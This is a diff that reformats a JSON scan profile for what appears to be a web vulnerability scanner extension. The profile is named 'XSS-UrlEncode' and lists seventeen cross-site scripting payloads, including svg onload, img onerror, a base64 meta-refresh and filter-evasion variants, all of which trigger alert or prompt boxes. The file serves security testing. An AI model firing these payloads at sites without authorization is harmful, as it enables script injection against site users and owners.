@@ -1,1 +1,52 @@
-[{"Name":"XSS-UrlEncode","Active":false,"Scanner":1,"Payloads":["\u003c/script\u003e\u003cscript\u003econfirm(1)\u003c/script\u003e","\"\u003e\u003cimg src\u003dx onerror\u003dprompt(1);\u003e.","\u003cSCRIPT\u003ea\u003d/XSS/.alert(a.source)\u003c/SCRIPT\u003e","\u003csvg oNLoAd\u003dalert(\u0027XSS\u0027)\u003e","\u003csvg/oNLoAd\u003dalert(1)\u003e","\"\u003e\u003cSCRIPT\u003ea\u003d/XSS/.alert(a.source)\u003c/SCRIPT\u003e\u003c!--","\u003csvg\u003e\u003cscript\u003ealert\u0026#40/1/.source\u0026#41\u003c/script\u003e\u003c/svg\u003e","javascript:/*--\u003e\u003c/title\u003e\u003c/style\u003e\u003c/textarea\u003e\u003c/script\u003e\u003c/xmp\u003e\u003csvg/onload\u003d\u0027+/\"/+/onmouseover\u003d1/+/[*/[]/+alert(11)//\u0027\u003e","\u003csvg \u003c/onload \u003d\"1\u003e (_\u003dalert,\n\n_(1337)) \"\"\u003e","\u003cmarquee loop\u003d1 width\u003d0 onfinish\u003dalert(2)\u003e","/\u003cmeta/content\u003d\"0;url\u003ddata:text/html;base64,\n\nPHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg\u003d\u003d\"http-equiv\u003drefresh\u003e","\u003csvg%0conload\u003dalert(1)\u003e","\u003csvg%0aonload\u003dalert(1)\u003e","\u003csvg%09onload\u003dalert(1)\u003e","\u003csvg%0donload\u003dalert(1)\u003e","\u003csvg%10onload\u003dalert(1)\u003e","\u003csvg%13onload\u003dalert(1)\u003e"],"Encoder":["URL-encode key characters"],"UrlEncode":false,"CharsToUrlEncode":"","SearchString":"","ReplaceString":"","Grep":[],"PayloadResponse":false,"NotResponse":false,"NotCookie":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","IsResponseCode":false,"ResponseCode":"","MatchType":4,"IssueName":"XSS-UrlEncode","IssueSeverity":"High","IssueConfidence":"Certain","IssueDetail":"XSS en con el payload:   \u003cgrep\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":""}]
+[
+ {
+  "Name": "XSS-UrlEncode", 
+  "Active": false, 
+  "Scanner": 1, 
+  "Payloads": [
+   "</script><script>confirm(1)</script>", 
+   "\"><img src=x onerror=prompt(1);>.", 
+   "<SCRIPT>a=/XSS/.alert(a.source)</SCRIPT>", 
+   "<svg oNLoAd=alert('XSS')>", 
+   "<svg/oNLoAd=alert(1)>", 
+   "\"><SCRIPT>a=/XSS/.alert(a.source)</SCRIPT><!--", 
+   "<svg><script>alert&#40/1/.source&#41</script></svg>", 
+   "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(11)//'>", 
+   "<svg </onload =\"1> (_=alert,\n\n_(1337)) \"\">", 
+   "<marquee loop=1 width=0 onfinish=alert(2)>", 
+   "/<meta/content=\"0;url=data:text/html;base64,\n\nPHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==\"http-equiv=refresh>", 
+   "<svg%0conload=alert(1)>", 
+   "<svg%0aonload=alert(1)>", 
+   "<svg%09onload=alert(1)>", 
+   "<svg%0donload=alert(1)>", 
+   "<svg%10onload=alert(1)>", 
+   "<svg%13onload=alert(1)>"
+  ], 
+  "Encoder": [
+   "URL-encode key characters"
+  ], 
+  "UrlEncode": false, 
+  "CharsToUrlEncode": "", 
+  "SearchString": "", 
+  "ReplaceString": "", 
+  "Grep": [], 
+  "PayloadResponse": false, 
+  "NotResponse": false, 
+  "NotCookie": false, 
+  "CaseSensitive": false, 
+  "ExcludeHTTP": false, 
+  "OnlyHTTP": false, 
+  "IsContentType": false, 
+  "ContentType": "", 
+  "IsResponseCode": false, 
+  "ResponseCode": "", 
+  "MatchType": 4, 
+  "IssueName": "XSS-UrlEncode", 
+  "IssueSeverity": "High", 
+  "IssueConfidence": "Certain", 
+  "IssueDetail": "XSS en con el payload:   <grep>", 
+  "RemediationDetail": "", 
+  "IssueBackground": "", 
+  "RemediationBackground": ""
+ }
+]
